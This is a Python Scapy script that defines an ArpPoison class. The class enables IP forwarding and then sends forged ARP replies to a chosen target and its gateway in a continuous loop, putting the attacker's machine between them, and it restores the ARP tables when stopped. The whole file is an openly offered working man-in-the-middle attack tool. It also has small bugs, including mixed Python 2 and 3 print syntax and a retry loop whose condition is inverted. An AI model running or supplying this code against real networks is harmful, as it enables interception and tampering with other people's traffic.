import time

from scapy.arch import get_if_hwaddr
from scapy.config import conf
from scapy.layers.l2 import Ether, ARP, getmacbyip
from scapy.sendrecv import sendp, send
from scapy import route
import os

def _enable_linux_iproute():
    """
    Enables IP route ( IP Forward ) in linux-based distro
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        f.write('1')


class ArpPoison:

    continueRunning = True
    target_ip = ''
    target_mac = ''
    gateway_ip = ''
    gateway_mac = ''
    interface = conf.iface

    def __init__(self, tgt_ip, gw_ip, iface):
        self.target_ip = tgt_ip
        self.gateway_ip = gw_ip
        self.interface = iface
        _enable_linux_iproute()

    def start(self):
        self.target_mac = getmacbyip(self.target_ip)
        self.gateway_mac = getmacbyip(self.gateway_ip)
        self.arp_poison()

    # ARP Poisoning
    def restore_network(self):
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=self.gateway_ip, hwsrc=self.target_mac, psrc=self.target_ip),
             verbose=False,
             count=5)
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=self.target_ip, hwsrc=self.gateway_mac, psrc=self.gateway_ip),
             verbose=False,
             count=5)

    def arp_poison(self):
        print("[*] Started ARP poison attack [CTRL-C to stop]")
        try:
            print "[*] Interface: " + str(self.interface)
            my_mac = get_if_hwaddr(self.interface)

            while (self.gateway_mac is None or self.target_mac is None) and not self.continueRunning:
                if self.target_mac is None:
                    print "[-] Could not find mac of target"
                    self.target_mac = getmacbyip(self.target_ip)

                if self.gateway_mac is None:
                    print "[-] Could not find mac of gateway"
                    self.gateway_mac = getmacbyip(self.gateway_ip)
                time.sleep(1)
                print "[*] Retrying"

            print("[*] Gateway mac: " + str(self.gateway_mac))
            print("[*] Target mac: " + str(self.target_mac))
            print("[*] Your mac: " + str(my_mac))

            packet1 = Ether() / ARP()
            packet1[Ether].src = my_mac
            packet1[ARP].hwsrc = my_mac
            packet1[ARP].psrc = self.gateway_ip
            packet1[ARP].hwdst = self.target_mac
            packet1[ARP].pdst = self.target_ip
            packet1[ARP].op = 2

            packet2 = Ether() / ARP()
            packet2[Ether].src = my_mac
            packet2[ARP].hwsrc = my_mac
            packet2[ARP].psrc = self.target_ip
            packet2[ARP].hwdst = self.gateway_mac
            packet2[ARP].pdst = self.gateway_ip
            packet2[ARP].op = 2

            while self.continueRunning:
                sendp(packet1, iface=self.interface, verbose=False)
                sendp(packet2, iface=self.interface, verbose=False)
                time.sleep(0.5)
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        self.continueRunning = False
        print("[*] Stopped ARP poison attack. Restoring network")
        self.restore_network()